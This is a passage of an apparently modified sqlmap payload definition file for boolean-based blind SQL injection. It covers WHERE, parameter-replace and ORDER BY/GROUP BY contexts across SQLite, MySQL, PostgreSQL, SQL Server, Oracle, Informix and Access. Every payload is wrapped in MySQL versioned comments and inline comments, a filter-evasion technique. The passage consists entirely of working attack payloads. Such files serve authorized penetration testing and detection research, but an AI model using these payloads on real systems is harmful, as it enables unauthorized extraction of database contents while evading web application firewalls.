        <vector>AND CASE WHEN [INFERENCE] THEN [RANDNUM] ELSE JSON('[RANDSTR]') END</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000JSON/**_**/*/('[/*!50000RANDSTR/**_**/*/]') /*!50000END/**_**/*/</payload>
        </request>
        <response>
            <comparison>AND CASE WHEN [RANDNUM]=[RANDNUM1] THEN [RANDNUM] ELSE JSON('[RANDSTR]') END</comparison>
        </response>
        <details>
            <dbms>SQLite</dbms>
        </details>
    </test>

    <test>
        <title>SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>3</risk>
        <clause>1</clause>
        <where>2</where>
        <vector>OR CASE WHEN [INFERENCE] THEN [RANDNUM] ELSE JSON('[RANDSTR]') END</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000JSON/**_**/*/('[/*!50000RANDSTR/**_**/*/]') /*!50000END/**_**/*/</payload>
        </request>
        <response>
            <comparison>OR CASE WHEN [RANDNUM]=[RANDNUM1] THEN [RANDNUM] ELSE JSON('[RANDSTR]') END</comparison>
        </response>
        <details>
            <dbms>SQLite</dbms>
        </details>
    </test>

    <!-- End of boolean-based blind tests - WHERE or HAVING clause -->

    <!-- Boolean-based blind tests - Parameter replace -->
    <test>
        <title>Boolean-based blind - Parameter replace (original value)</title>
        <stype>1</stype>
        <level>1</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</vector>
        <request>
            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ (/*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/] /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM2/**_**/*/]) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</comparison>
        </response>
    </test>

    <test>
        <title>MySQL boolean-based blind - Parameter replace (MAKE_SET)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>MAKE_SET([INFERENCE],[RANDNUM])</vector>
        <request>
            <payload>/*!50000MAKE_SET/**_**/*/(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,[/*!50000RANDNUM1/**_**/*/])</payload>
        </request>
        <response>
            <comparison>MAKE_SET([RANDNUM]=[RANDNUM1],[RANDNUM1])</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>MAKE_SET([INFERENCE],[ORIGVALUE])</vector>
        <request>
            <payload>/*!50000MAKE_SET/**_**/*/(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,[/*!50000ORIGVALUE/**_**/*/])</payload>
        </request>
        <response>
            <comparison>MAKE_SET([RANDNUM]=[RANDNUM1],[ORIGVALUE])</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL boolean-based blind - Parameter replace (ELT)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>ELT([INFERENCE],[RANDNUM])</vector>
        <request>
            <payload>/*!50000ELT/**_**/*/(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,[/*!50000RANDNUM1/**_**/*/])</payload>
        </request>
        <response>
            <comparison>ELT([RANDNUM]=[RANDNUM1],[RANDNUM1])</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL boolean-based blind - Parameter replace (ELT - original value)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>ELT([INFERENCE],[ORIGVALUE])</vector>
        <request>
            <payload>/*!50000ELT/**_**/*/(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,[/*!50000ORIGVALUE/**_**/*/])</payload>
        </request>
        <response>
            <comparison>ELT([RANDNUM]=[RANDNUM1],[ORIGVALUE])</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL boolean-based blind - Parameter replace (bool*int)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>([INFERENCE])*[RANDNUM]</vector>
        <request>
            <payload>(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)*[/*!50000RANDNUM1/**_**/*/]</payload>
        </request>
        <response>
            <comparison>([RANDNUM]=[RANDNUM1])*[RANDNUM1]</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL boolean-based blind - Parameter replace (bool*int - original value)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>([INFERENCE])*[ORIGVALUE]</vector>
        <request>
            <payload>(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)*[/*!50000ORIGVALUE/**_**/*/]</payload>
        </request>
        <response>
            <comparison>([RANDNUM]=[RANDNUM1])*[ORIGVALUE]</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>PostgreSQL boolean-based blind - Parameter replace</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))</vector>
        <request>
            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/**_**/*//(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <test>
        <title>PostgreSQL boolean-based blind - Parameter replace (original value)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))</vector>
        <request>
            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!500001/**_**/*//(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <!-- Because of the syntax of GENERATE_SERIES() function, the 'then' condition must be 1, do not change it -->
    <test>
        <title>PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1)</vector>
        <request>
            <payload>(/*!50000SELECT/**_**/*/ * /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES/**_**/*/(/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM]/**_**/*/,/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END/**_**/*/) /*!50000LIMIT/**_**/*/ /*!500001/**_**/*/)</payload>
        </request>
        <response>
            <comparison>(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1)</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <!-- Because of the syntax of GENERATE_SERIES() function, the 'then' condition must be 1, do not change it -->
    <test>
        <title>PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>(SELECT [ORIGVALUE] FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1)</vector>
        <request>
            <payload>(/*!50000SELECT/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES/**_**/*/(/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM]/**_**/*/,/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END/**_**/*/) /*!50000LIMIT/**_**/*/ /*!500001/**_**/*/)</payload>
        </request>
        <response>
            <comparison>(SELECT [ORIGVALUE] FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1)</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft SQL Server/Sybase boolean-based blind - Parameter replace</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</vector>
        <request>
            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[RANDNUM]/**_**/*/*(/*!50000SELECT/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/]) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</comparison>
        </response>
        <details>
            <dbms>Microsoft SQL Server</dbms>
            <dbms>Sybase</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</vector>
        <request>
            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000[RANDNUM]/**_**/*/*(/*!50000SELECT/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/]) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</comparison>
        </response>
        <details>
            <dbms>Microsoft SQL Server</dbms>
            <dbms>Sybase</dbms>
        </details>
    </test>

    <test>
        <title>Oracle boolean-based blind - Parameter replace</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)</vector>
        <request>
            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/(/*!500001/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT/**_**/*/)/(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/)</payload>
        </request>
        <response>
            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)</comparison>
        </response>
        <details>
            <dbms>Oracle</dbms>
        </details>
    </test>

    <test>
        <title>Oracle boolean-based blind - Parameter replace (original value)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)</vector>
        <request>
            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/(/*!500001/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT/**_**/*/)/(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/)</payload>
        </request>
        <response>
            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)</comparison>
        </response>
        <details>
            <dbms>Oracle</dbms>
        </details>
    </test>

    <test>
        <title>Informix boolean-based blind - Parameter replace</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)</vector>
        <request>
            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/**_**/*///*!500000/**_**/*/ /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000SYSMASTER/**_**/*/:/*!50000SYSDUAL/**_**/*/)</payload>
        </request>
        <response>
            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)</comparison>
        </response>
        <details>
            <dbms>Informix</dbms>
        </details>
    </test>

    <test>
        <title>Informix boolean-based blind - Parameter replace (original value)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL)</vector>
        <request>
            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000SYSMASTER/**_**/*/:/*!50000SYSDUAL/**_**/*/)</payload>
        </request>
        <response>
            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL)</comparison>
        </response>
        <details>
            <dbms>Informix</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft Access boolean-based blind - Parameter replace</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>IIF([INFERENCE],[RANDNUM],1/0)</vector>
        <request>
            <payload>/*!50000IIF/**_**/*/(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM]/**_**/*/,/*!500001/**_**/*///*!500000/**_**/*/)</payload>
        </request>
        <response>
            <comparison>IIF([RANDNUM]=[RANDNUM1],[RANDNUM],1/0)</comparison>
        </response>
        <details>
            <dbms>Microsoft Access</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft Access boolean-based blind - Parameter replace (original value)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>IIF([INFERENCE],[ORIGVALUE],1/0)</vector>
        <request>
            <payload>/*!50000IIF/**_**/*/(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,[/*!50000ORIGVALUE/**_**/*/],/*!500001/**_**/*///*!500000/**_**/*/)</payload>
        </request>
        <response>
            <comparison>IIF([RANDNUM]=[RANDNUM1],[ORIGVALUE],1/0)</comparison>
        </response>
        <details>
            <dbms>Microsoft Access</dbms>
        </details>
    </test>

    <!-- Works in MySQL, Oracle, etc. -->
    <test>
        <title>Boolean-based blind - Parameter replace (DUAL)</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>(CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)</vector>
        <request>
            <payload>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[RANDNUM]/**_**/*/*(/*!50000SELECT/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/] /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/)</payload>
        </request>
        <response>
            <comparison>(CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)</comparison>
        </response>
    </test>

    <test>
        <title>Boolean-based blind - Parameter replace (DUAL - original value)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>(CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)</vector>
        <request>
            <payload>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000[RANDNUM]/**_**/*/*(/*!50000SELECT/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/] /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/)</payload>
        </request>
        <response>
            <comparison>(CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)</comparison>
        </response>
    </test>
    <!-- End of boolean-based blind tests - Parameter replace -->

    <!-- Works in SAP MaxDB, Informix, etc. -->
    <test>
        <title>Boolean-based blind - Parameter replace (CASE)</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>(CASE WHEN [INFERENCE] THEN [RANDNUM] ELSE NULL END)</vector>
        <request>
            <payload>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/)</payload>
        </request>
        <response>
            <comparison>(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [RANDNUM] ELSE NULL END)</comparison>
        </response>
    </test>

    <test>
        <title>Boolean-based blind - Parameter replace (CASE - original value)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>(CASE WHEN [INFERENCE] THEN [ORIGVALUE] ELSE NULL END)</vector>
        <request>
            <payload>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/ /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/)</payload>
        </request>
        <response>
            <comparison>(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [ORIGVALUE] ELSE NULL END)</comparison>
        </response>
    </test>
    <!-- End of boolean-based blind tests - Parameter replace -->

    <!-- Boolean-based blind tests - ORDER BY, GROUP BY clause -->
    <test>
        <title>MySQL &gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[RANDNUM]/**_**/*/*(/*!50000SELECT/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
            <dbms_version>&gt;= 5.0</dbms_version>
        </details>
    </test>

    <test>
        <title>MySQL &gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000[RANDNUM]/**_**/*/*(/*!50000SELECT/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
            <dbms_version>&gt;= 5.0</dbms_version>
        </details>
    </test>

    <test>
        <title>MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[RANDNUM]/**_**/*/*(/*!50000SELECT/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
            <dbms_version>&lt; 5.0</dbms_version>
        </details>
    </test>

    <test>
        <title>MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000[RANDNUM]/**_**/*/*(/*!50000SELECT/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
        </response>
        <details>
